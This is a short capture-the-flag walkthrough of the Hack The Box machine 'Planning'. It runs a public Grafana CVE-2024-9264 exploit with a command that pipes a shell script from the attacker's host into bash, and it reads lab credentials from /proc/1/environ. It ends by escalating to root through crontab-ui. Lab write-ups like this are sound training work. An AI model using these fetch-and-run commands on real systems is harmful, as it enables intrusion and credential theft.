# Planning - HTB
Difficulty: Easy

## Enumeration
Ports: 22,80

### Port 80:
    - Hostname: planning.htb
    - Has a vhost grafana.planning.htb


## Initial FootHold

Use this [exploit](https://github.com/nollium/CVE-2024-9264) to exploit grafana, creds are provided by the machine creators.

I used this command
```bash
python ./CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "curl http://10.10.14.16:8080/shell.sh | bash" http://grafana.planning.htb
```

Now stabilize the shell using:
```bash
script /dev/null -c /bin/bash
```

This will give a stable shell in a docker container as root user. We need to escape this.

By checking the `/proc/1/environ` file we get this password **RioTecRANDEntANT!** and a username **enzo**

Let's try to ssh in using this, which works.

## Privilege Escalation
So I used linpeas.sh and found this file /opt/crontabs/crontab.db which contained a password, which I used to login as root into the hidden service in port 8000 (just port forward it to ur machine).

Then the service was running crontab-ui which I used to to run a malicious script that gave me a shell.
